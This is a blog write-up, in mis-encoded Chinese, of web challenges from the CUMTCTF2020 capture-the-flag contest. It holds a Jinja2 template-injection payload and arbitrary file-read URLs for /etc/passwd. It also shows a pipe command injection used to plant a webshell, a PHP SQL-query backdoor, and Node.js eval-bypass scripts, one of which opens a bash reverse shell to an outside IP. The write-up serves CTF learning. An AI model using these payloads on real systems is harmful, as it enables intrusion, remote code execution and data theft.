<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <meta name="renderer" content="webkit">

  
  <title>CUMTCTF2020 | Dragon&#39;s Blog</title>

  <link rel="shortcut icon" href="/images/favicon.png">
  <link rel="alternate" href="/atom.xml" title="Dragon's Blog">
  <meta name="description" content="Webbabyflaskç»è¿‡æµ‹è¯•ï¼Œæœ¬é¢˜æ˜¯jinja2æ¨¡æ¿æ³¨å…¥ã€‚å¸¸è§çš„bypasså¥—è·¯ï¼Œæ„é€  {{request|attr(&#39;application&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__i&#39;+&#39;mport__&#39;)(&#39;o&#39;+&#39;s&#39;)|attr(&#39;popen&#39;)(&#39;cat &#x2F;fl">
<meta property="og:type" content="article">
<meta property="og:title" content="CUMTCTF2020">
<meta property="og:url" content="https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/index.html">
<meta property="og:site_name" content="Dragon&#39;s Blog">
<meta property="og:description" content="Webbabyflaskç»è¿‡æµ‹è¯•ï¼Œæœ¬é¢˜æ˜¯jinja2æ¨¡æ¿æ³¨å…¥ã€‚å¸¸è§çš„bypasså¥—è·¯ï¼Œæ„é€  {{request|attr(&#39;application&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__i&#39;+&#39;mport__&#39;)(&#39;o&#39;+&#39;s&#39;)|attr(&#39;popen&#39;)(&#39;cat &#x2F;fl">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixabzbhe8j30px0hnn2g.jpg">
<meta property="og:image" content="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gk1knho4rnj31160ajq40.jpg">
<meta property="og:image" content="https://tva4.sinaimg.cn/large/007u7C9Rgy1gk2x07rf7bj318q06st91.jpg">
<meta property="og:image" content="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gk2xdct1w4j30ip05yt8r.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk2xk51ytij30ox0e5t9y.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk1l2ga4b2j31f506mt9w.jpg">
<meta property="og:image" content="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gk2z9mppm8j30fl01xt8j.jpg">
<meta property="og:image" content="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gk2zbgjkg3j307t043746.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk2zbshfnij30ff049mx0.jpg">
<meta property="og:image" content="https://tva2.sinaimg.cn/large/007u7C9Rgy1gk2zfvob7bj307j02fa9v.jpg">
<meta property="og:image" content="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gk2zhhhn8cj30cf0gv3yr.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk1m5ff1awj30de033t8j.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk1qm67qs5j30et0cpwg1.jpg">
<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gk1quv0f3fj30vh0mrtat.jpg">
<meta property="article:published_time" content="2020-10-25T16:00:00.000Z">
<meta property="article:modified_time" content="2020-10-26T12:04:23.304Z">
<meta property="article:author" content="ç¬é­”é¾™">
<meta property="article:tag" content="cumt">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixabzbhe8j30px0hnn2g.jpg">

  <meta name="format-detection" content="telephone=no,email=no">
  <meta name="theme-color" content="#9C27B0">
  <meta name="description" content="">
  <meta name="keywords" content=",cumt">

  <meta name="mobile-web-app-capable" content="yes">
  <meta name="application-name" content="Dragon&#39;s Blog">
  <meta name="msapplication-starturl" content="https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/">
  <meta name="msapplication-navbutton-color" content="#9C27B0">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Dragon&#39;s Blog">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-icon" href="/images/favicon.png">

  
    <meta property="article:published_time" content="Mon Oct 26 2020 00:00:00 GMT+0800">
    <meta property="article:modified_time" content="Mon Oct 26 2020 20:04:23 GMT+0800">
  

  
    <link rel="canonical" href="https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/">
  

  
  

  
  
  

  
<link rel="stylesheet" href="/css/mdui.css">
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Dragon's Blog" type="application/atom+xml">
</head>
<body class="mdui-appbar-with-toolbar mdui-drawer-body-left mdui-theme-primary-indigo mdui-theme-accent-pink">
  <script>var a=localStorage.getItem("mdui-theme-layout-dark");if(a){document.getElementsByTagName("body")[0].className+=" mdui-theme-layout-dark"};</script>
  <header id="header" class="mdui-appbar mdui-appbar-fixed mdui-appbar-scroll-hide mdui-appbar-inset">
  <div class="mdui-toolbar mdui-color-theme">
    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-drawer="{target: '#sidebar', swipe: true}"><i class="mdui-icon material-icons">menu</i></a>
    <a href="/" class="mdui-typo-headline">Dragon&#39;s Blog</a>
    <div class="mdui-toolbar-spacer"></div>
    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-dialog="{target: '#search'}" mdui-tooltip="{content: 'æœç´¢'}"><i class="mdui-icon material-icons">search</i></a>
    <a href="/atom.xml" class="mdui-btn mdui-btn-icon" mdui-tooltip="{content: 'RSS'}"><i class="mdui-icon material-icons">rss_feed</i></a>
  </div>
</header>
<div class="mdui-dialog" id="search">
  
    <div class="search-form">
      <input type="search" class="search-form-input" placeholder="è¾“å…¥å…³é”®è¯">
    </div>
    <div class="search-result" data-resource="/search.xml"></div>
  
</div>
  <aside id="sidebar" class="mdui-drawer mdui-drawer-full-height">
  <div class="mdui-grid-tile">
    <img src="/images/banner.png" style="height: 160px;">
    <img src="/images/touxiang.png" class="avatar-animation" style="position: absolute; top: 10%; left: 24px; width: 64px; height: 64px; border: 2px solid #fff; border-radius: 50%;">
    <div class="mdui-grid-tile-actions">
      <div class="mdui-grid-tile-text">
        <div class="mdui-grid-tile-title">ç¬é­”é¾™</div>
        <div class="mdui-grid-tile-subtitle"><i class="mdui-icon material-icons">art_track</i></div>
      </div>
      
    </div>
  </div>

  <div class="mdui-list" mdui-collapse="{accordion: true}">
    <a href="/" class="mdui-list-item mdui-ripple">
      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-blue">home</i>
      <div class="mdui-list-item-content">ä¸»é¡µ</div>
    </a>
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-deep-orange">inbox</i>
        <div class="mdui-list-item-content">å½’æ¡£</div>
        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
        <a class="mdui-ripple sidebar_archives-link" href="/archives/2020/10/">åæœˆ 2020<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/archives/2020/09/">ä¹æœˆ 2020<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/archives/2020/07/">ä¸ƒæœˆ 2020<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/archives/2020/06/">å…­æœˆ 2020<span class="mdui-ripple sidebar_archives-count">2</span></a>
        
      </div>
    </div>
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-green">chrome_reader_mode</i>
        <div class="mdui-list-item-content">åˆ†ç±»</div>
        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
        <a class="mdui-ripple sidebar_archives-link" href="/categories/acm/">acm<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/web/">web<span class="mdui-ripple sidebar_archives-count">5</span></a>
        
      </div>
    </div>
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-brown">bookmark</i>
        <div class="mdui-list-item-content">æ ‡ç­¾</div>
        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
        <a class="mdui-ripple sidebar_archives-link" href="/tags/buuoj/" rel="tag">buuoj<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/tags/cumt/" rel="tag">cumt<span class="mdui-ripple sidebar_archives-count">4</span></a><a class="mdui-ripple sidebar_archives-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sqlæ³¨å…¥<span class="mdui-ripple sidebar_archives-count">1</span></a>
        
      </div>
    </div>
    <a href="/about" class="mdui-list-item mdui-ripple">
      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-purple">person</i>
      <div class="mdui-list-item-content">å…³äº</div>
    </a>
  </div>

  <div class="mdui-divider"></div>

  <div class="mdui-list" mdui-collapse="{accordion: true}">
    
      <a href="https://github.com/devildragons" target="_blank" rel="noopener" class="mdui-list-item mdui-ripple">Github</a>
    
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <div class="mdui-list-item-content">å‹æƒ…é“¾æ¥</div>
        <i class="mdui-list-item-icon mdui-icon material-icons">link</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
          <a href="https://xzlxr.github.io/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">fe1w0</a>
        
          <a href="http://iyzyi.com/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">iyzyi</a>
        
          <a href="https://ljzjsc.com/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">ç‰¢è®°è‡ªå·±æ˜¯èœ</a>
        
          <a href="http://iv4n.cc/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">iv4n</a>
        
          <a href="https://3nd.xyz/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">3ND</a>
        
          <a href="https://skysec.top/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">ä¸€å¶é£˜é›¶</a>
        
          <a href="http://ueverglow.top/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">é›¨å¤œå¶é›¨</a>
        
          <a href="http://iluem.xyz/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">iluem</a>
        
        
      </div>
    </div>
  </div>
</aside>
  <main id="main" class="mdui-m-t-5 fadeIn animated">
  
<link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">

  <style>#main article .mdui-card-content .center-block{display:block!important;margin-right:auto!important;margin-left:auto!important}</style>
  <article class="mdui-card mdui-m-b-5">
    <header class="mdui-card-media">
      <img src="/images/random/material-3.png" style="max-height: 240px;">
      <div class="mdui-card-media-covered">
        <div class="mdui-card-primary">
          <div class="mdui-card-primary-title">CUMTCTF2020</div>
          <div class="mdui-card-primary-subtitle"><i class="iconfont">&#xe697;</i> 2020-10-26 / <i class="iconfont">&#xe601;</i> ç¬é­”é¾™ &nbsp;&nbsp; <span id="busuanzi_container_page_pv" style="display: none;"><i class="iconfont">&#xe7fd;</i> <span id="busuanzi_value_page_pv"></span></span></div>
        </div>
      </div>
      <div class="mdui-card-menu">
        
          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#qrcode', align: 'right'}"><i class="mdui-icon material-icons">devices</i></button>
          <ul class="mdui-menu" id="qrcode">
            
              <li class="mdui-menu-item"><a class="mdui-text-center mdui-ripple">Send to mobile phone</a></li>
            
            <li class="mdui-menu-item" disabled>
              
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAAC1ElEQVR42u3aUW4iQQwEUO5/6d0DRCFV9iBg+s0XypDpfkRK0bYf/468HtjY2NjY2NjY2NgfyX7E1+b9+xU3T8DGxsY+gf3Hv/5fFv65ieQ9z1dM8MM9Y2NjYx/AnkVIHirPkZuPINozNjY2NvZio5tQxMbGxsZ+BTsJrdlBBRsbGxt7w07CJoG1EdiWn95QS8PGxsb+ePas7fre12/ob2NjY2N/JLseYRwN9MyisQ2tYvgSGxsb+0bsZJk/gqENkuBu0mDOn4ONjY19AntzGGiLQXlJaLbir6tjY2Nj35SdRMsmoq4qFbVDP9jY2NjnsGcRlReb2uBpW8J5QGJjY2OfwJ4FQ7Jw+/O2LRGthY2NjX1Tdl6gSQo3+ceX3L24UIWNjY19ADsfppkdSNqRncfiwsbGxj6H3YZW8hHkYzptkWhV9sLGxsY+mN0eIdpBnHzoZ9ZIwMbGxr43Oy/itLx2i7NGb3FMwsbGxr41exYVbZNgdqjIm8R//DGwsbGxb8pui+xt2Sgf2blqVKguKmFjY2N/OTsqrK+HafL2QF5Oqn8XGxsb+9bshDTb4r6J21LrohI2Njb2l7M3j06OFhtY8s4iULGxsbEPYM++7r+i/HTVOBE2Njb2CexZCzY/nOSFqlkJKR/cwcbGxr4rO/9a3wZVPgC0D8hodWxsbOybsjfHkqRUtImrtv2MjY2Njd02AGbDPW1xPzka1e0BbGxs7BuxZwM6G3y+bhtvw64INjY29pez2yvZ+qYBnNzNn4ONjY19Ars9HszY7QGjbUVjY2NjY+ehlRShkoHLWeMhXzca2cHGxsa+HXtWYMqDpC1UbZoNRYBhY2NjH8bOB32e45MGw6apcHGAYWNjY9+O3TZ9rz2c5K0CbGxs7NPYbVN21o5NwmkTdS9sD2BjY2N/MHsWJ1eVkGZDn0nJCRsbG/sE9jkXNjY2NjY2NjY29sdc/wGi5UfqRVJEawAAAABJRU5ErkJggg==">
              
            </li>
          </ul>
        
        
          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#share_menu', align: 'right'}"><i class="mdui-icon material-icons">share</i></button>
          <ul class="mdui-menu" id="share_menu">
            <li class="mdui-menu-item">
              <a href="http://service.weibo.com/share/share.php?appkey=&title=CUMTCTF2020&url=https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/&pic=https://devildragons.github.io/images/favicon.png&searchPic=false&style=simple" target="_blank" class="mdui-ripple">åˆ†äº«åˆ°å¾®åš</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://twitter.com/intent/tweet?text=CUMTCTF2020&url=https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/&via=ç¬é­”é¾™" target="_blank" class="mdui-ripple">åˆ†äº«åˆ°Twitter</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://www.facebook.com/sharer/sharer.php?u=https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/" target="_blank" class="mdui-ripple">åˆ†äº«åˆ°Facebook</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://plus.google.com/share?url=https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/" target="_blank" class="mdui-ripple">åˆ†äº«åˆ°Google+</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/&title=CUMTCTF2020" target="_blank" class="mdui-ripple">åˆ†äº«åˆ°LinkedIn</a>
            </li>
            <li class="mdui-menu-item">
              <a href="http://connect.qq.com/widget/shareqq/index.html?site=Dragon&#39;s Blog&title=CUMTCTF2020&summary=&pics=https://devildragons.github.io/images/favicon.png&url=https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/" target="_blank" class="mdui-ripple">åˆ†äº«åˆ°QQ</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://telegram.me/share/url?url=https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/&text=CUMTCTF2020" target="_blank" class="mdui-ripple">åˆ†äº«åˆ°Telegram</a>
            </li>
          </ul>
        
      </div>
    </header>
    <div class="mdui-card-content mdui-typo">
      <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixabzbhe8j30px0hnn2g.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gk1knho4rnj31160ajq40.jpg" alt=""><br>ç»è¿‡æµ‹è¯•ï¼Œæœ¬é¢˜æ˜¯jinja2æ¨¡æ¿æ³¨å…¥ã€‚<br>å¸¸è§çš„bypasså¥—è·¯ï¼Œæ„é€ </p>
<pre><code>{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__i'+'mport__')('o'+'s')|attr('popen')('cat /flag')|attr('read')()}}</code></pre><p>importå’Œosè¢«è¿‡æ»¤ï¼Œé‡‡ç”¨å­—ç¬¦æ‹¼æ¥çš„æ–¹æ³•ç»•è¿‡ã€‚</p>
<p>å‚è€ƒï¼š<br><a href="https://www.gem-love.com/ctf/2634.html#babyflask" target="_blank" rel="noopener" title="babyflask">https://www.gem-love.com/ctf/2634.html#babyflask</a></p>
<h2 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h2><p>è¯¥é¢˜å­˜åœ¨è®¸å¤šæ¼æ´ã€‚<br>å…¶ä¸­ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼š</p>
<pre><code>http://202.119.201.199:9002/about/index/blog/?url=file:///etc/passwd
http://202.119.201.199:9002/about/index/index/?file=/etc/passwd</code></pre><p><code>http://202.119.201.199:9002/member/index/login</code>ä¸ºä¼šå‘˜çš„ç™»å½•ç½‘ç«™ï¼ŒçŒœæµ‹adminçš„ç™»å½•ç½‘ç«™ä¸º<code>http://202.119.201.199:9002/admin/index/login</code>ï¼Œå°è¯•è´¦å·<code>admin</code>ï¼Œå¯†ç <code>admin</code>æˆåŠŸç™»å½•ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gk2x07rf7bj318q06st91.jpg" alt=""><br>ç„¶ååœ¨æ£€æµ‹ç›®æ ‡IPä¸»æœºçŠ¶æ€ä¸­æœ‰æ¼æ´ï¼Œå¯ä»¥ç”¨|ä»è€Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚äºæ˜¯æƒ³åˆ°åœ¨ç›®å½•å†™å…¥ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gk2xdct1w4j30ip05yt8r.jpg" alt=""></p>
<p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk2xk51ytij30ox0e5t9y.jpg" alt=""><br>ä»database.phpä¸­å¯ä»¥çŸ¥é“æ•°æ®åº“çš„ä¿¡æ¯ã€‚</p>
<pre><code>&lt;?php
$servername = &quot;mysql&quot;;
$username = &quot;root&quot;;
$password = &quot;root&quot;;
$dbname = &quot;yxjcms&quot;;
$conn = mysqli_connect($servername, $username, $password,$dbname);
if (!$conn) {
  die(&quot;Connection failed: &quot; . mysqli_connect_error());
}
else{
  echo(&quot;âœ”&quot;);
}
$sql = $_POST[&apos;sql&apos;];
$result = $conn-&gt;query($sql);
if ($result-&gt;num_rows &gt; 0) {
  // è¾“å‡ºæ•°æ®
  while($row = $result-&gt;fetch_assoc()) {
    var_dump($row);
    echo(&quot;ğŸ´â€¢â˜  &quot;);
 }
} else {
  echo &quot;âœ–&quot;;
}
$conn-&gt;close();
?&gt;</code></pre><p>åˆ›å»ºä¸€ä¸ªæŸ¥è¯¢æ•°æ®åº“çš„mysql.phpæ–‡ä»¶ã€‚<br>ä½¿ç”¨show tablesï¼ŒæŸ¥è¯¢åˆ°flagishereè¡¨ï¼Œä½¿ç”¨select * from flagishereè·å¾—flagã€‚</p>
<h2 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk1l2ga4b2j31f506mt9w.jpg" alt=""><br>æŸ¥çœ‹æºç å‘ç°å¾ˆå¤šè¡¨æƒ…ï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œæ˜¯aaencodeç¼–ç ã€‚<br>ç»è¿‡aaencodeè§£å¯†å†Unicodeè§£å¯†è·å¾—é¢˜ç›®æºç ã€‚</p>
<pre><code> var isBegin = false;

function numRand() {
var x = 9999;
var y = 1000;
var rand = parseInt(Math.random() * (x - y + 1) + y);
return rand;
}

function isPrimeNum(num) {
return !/^.?$|^(..+?)\1+$/.test(Array(num + 1).join(&apos;1&apos;))
}

function check(num) {
if (isPrimeNum(num)) {
    $.ajax({
        url: &apos;check.php&apos;,
        type: &apos;POST&apos;,
        data: &apos;num=&apos; + num,
        success: function (data) {
            alert(data);
        }
    })
} else {
    alert( &apos;It seems t&apos;
    +&apos;hat you are&apos;
    +&apos; not lucky &apos;
    +&apos;enough, ple&apos;
    +&apos;ase keep tr&apos;
    +&apos;ying.&apos;)
}
}
$(function () {
var u = 265;
$(&apos;.btn&apos;).click(function () {
    if (isBegin) return false;
    isBegin = true;
    $(&quot;.num&quot;).css(&apos;background-position&apos;, &apos;11px 0&apos;);
    var result = numRand();
    var num_arr = (result + &apos;&apos;).split(&apos;&apos;);
    $(&quot;.num&quot;).each(function (index) {
        var _num = $(this);
        var yPos = (u * 60) - (u * num_arr[index]);
        setTimeout(function () {
            _num.animate({
                backgroundPosition: &apos;11px &apos; + yPos + &apos;px&apos;
            }, {
                duration: 6000 + index * 3000,
                easing: &quot;easeInOutCirc&quot;,
                complete: function () {
                    if (index == 3) {
                        isBegin = false;
                        check(result);
                    }
                }
            });
        }, index);
    });
});
});</code></pre><p>å®¡è®¡ä»£ç å¯çŸ¥ï¼Œåªè¦åœ¨check.phpä¸­POSTçš„4ä½numä¸ºç´ æ•°å³å¯è·å¾—flagã€‚<br>äºæ˜¯POST num=2333,å¾—åˆ°flagçš„base64ç¼–ç ã€‚</p>
<pre><code>Y3VtdGN0Znt3M2xjMG1lX3QwX2N1bXRjdGZfQH0=</code></pre><p>è§£ç è·å¾—flagã€‚</p>
<h2 id="koa-lt"><a href="#koa-lt" class="headerlink" title="koa&lt;"></a>koa&lt;</h2><p>æ‰“å¼€é¡µé¢çœ‹åˆ°ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç åè·å¾—é¢˜ç›®æºç ã€‚</p>
<pre><code>const Koa = require(&apos;koa&apos;);
const Router = require(&apos;koa-router&apos;);
const Parser = require(&apos;koa-bodyparser&apos;);
const fs = require(&apos;fs&apos;);

let app = new Koa();
let router = new Router();

app.use(Parser());

router.get(&apos;/&apos;, async ctx =&gt; {
ctx.response.body = `&lt;html&gt;&lt;a href=&quot;/src&quot;&gt;Source Code&lt;/a&gt;&lt;/html&gt;`;
});

let btoa = s =&gt; new Buffer(s + &apos;&apos;).toString(encoding=&apos;base64&apos;);
let atob = s =&gt; new Buffer(s + &apos;&apos;, encoding=&apos;base64&apos;).toString();
const src = btoa(fs.readFileSync(&apos;app.js&apos;));

router.get(&apos;/src&apos;, async ctx =&gt; {
ctx.response.body = src;
});

let filter = expr =&gt; {
let blacklist = [&apos;(&apos;, &apos;)&apos;, &apos;.&apos;, &apos;&amp;&apos;, &apos;#&apos;, &apos;\\&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos; &apos;];
for (const ele of expr) {
    if (blacklist.includes(ele))
        return false;
}
return true;
}

router.post(&apos;/expr&apos;, async ctx =&gt; {
let expr = ctx.request.body.expr || &apos;8 ^ 1&apos;;
if (!filter(expr)) {
    ctx.response.body = &apos;?&apos;;
    return;
}
ctx.response.body = eval(expr);
})

app.use(router.routes());
app.listen(9999);</code></pre><p>é¢˜ç›®ç»™äº†hint:<code>=</code>ã€‚æ‰€ä»¥å…ˆPOST</p>
<p>expr=   <code>filter=e=&gt;{return/**/true}</code>,è¿™æ ·ä½¿filterä¸ºtrueï¼Œå³å¯ç»•è¿‡blacklistã€‚</p>
<p>å› ä¸ºæœ¬é¢˜ä¸ºnodejsï¼Œç„¶åPOST </p>
<p>expr=<code>global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString()</code></p>
<p>æ‰€ä»¥è„šæœ¬ä¸ºï¼š</p>
<pre><code>import requests
url=&quot;http://219.219.61.234:30000/expr&quot;
res1=requests.post(url,data={&quot;expr&quot;:&quot;filter=e=&gt;{return/**/true}&quot;})
print(res1.text)
res2=requests.post(url,data=
{&quot;expr&quot;:&apos;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString()&apos;})
print(res2.text)</code></pre><p>å³å¯è¯»å–flagã€‚</p>
<h2 id="koa-gt"><a href="#koa-gt" class="headerlink" title="koa&gt;"></a>koa&gt;</h2><p>æœ¬é¢˜å’Œä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œåªæ˜¯è¿‡æ»¤ä¸åŒã€‚</p>
<pre><code>const Koa = require(&apos;koa&apos;);
const Router = require(&apos;koa-router&apos;);
const Parser = require(&apos;koa-bodyparser&apos;);
const fs = require(&apos;fs&apos;);

let app = new Koa();
let router = new Router();

app.use(Parser());

router.get(&apos;/&apos;, async ctx =&gt; {
ctx.response.body = `&lt;html&gt;&lt;a href=&quot;/src&quot;&gt;Source Code&lt;/a&gt;&lt;/html&gt;`;
});

let btoa = s =&gt; new Buffer(s + &apos;&apos;).toString(encoding=&apos;base64&apos;);
let atob = s =&gt; new Buffer(s + &apos;&apos;, encoding=&apos;base64&apos;).toString();
const src = btoa(fs.readFileSync(&apos;app.js&apos;));

router.get(&apos;/src&apos;, async ctx =&gt; {
ctx.response.body = src;
});

let filter = expr =&gt; {
let blacklist = [&apos;(&apos;, &apos;)&apos;, &apos;=&apos;, &apos;.&apos;, &apos;&amp;&apos;, &apos;#&apos;, &apos;\\&apos;, &apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;;&apos;, &apos; &apos;];
for (const ele of expr) {
    if (blacklist.includes(ele))
        return false;
}
return true;
}

router.post(&apos;/expr&apos;, async ctx =&gt; {
let expr = ctx.request.body.expr || &apos;8 ^ 1&apos;;
if (!filter(expr)) {
    ctx.response.body = &apos;?&apos;;
    return;
}
ctx.response.body = eval(expr);
})

app.use(router.routes());
app.listen(9999);</code></pre><p>æœ¬é¢˜ä¸ä¸Šä½“æ¯”è¾ƒï¼Œå¤šè¿‡æ»¤äº†=å’Œ&#39;ï¼Œä½†æ˜¯å°‘è¿‡æ»¤äº†ï¼Œè€Œä¸”ç»™äº†hint:  <code>tagged template</code>,<img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gk2z9mppm8j30fl01xt8j.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gk2zbgjkg3j307t043746.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk2zbshfnij30ff049mx0.jpg" alt=""><br>æœ€ç»ˆpayload:</p>
<pre><code>import requests
url=&quot;http://219.219.61.234:30001/src&quot;
res=requests.get(url)
url = &quot;http://219.219.61.234:30001/expr&quot;
headers ={&apos;test&apos;:&apos;&apos;&apos;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&apos;bash -c &quot;/bin/bash -i &gt; /dev/tcp/107.191.41.65/90 0&lt;&amp;1 2&gt;&amp;1&quot;&apos;).toString()&apos;&apos;&apos;}
res=requests.post(url,data={&quot;expr&quot;:&apos;&apos;&apos;Function`s${ctx[`header`][`test`]}```&apos;&apos;&apos;},headers=headers)
print(res.text)</code></pre><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gk2zfvob7bj307j02fa9v.jpg" alt=""></p>
<p>ç„¶ååœ¨æœåŠ¡å™¨ä¸Šå¯¹è®¾ç½®çš„ç«¯å£è¿›è¡Œç›‘å¬ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gk2zhhhn8cj30cf0gv3yr.jpg" alt=""><br>è¿è¡Œä»£ç ï¼Œåœ¨æœåŠ¡å™¨è¿è¡Œ/readflagè·å–flagã€‚</p>
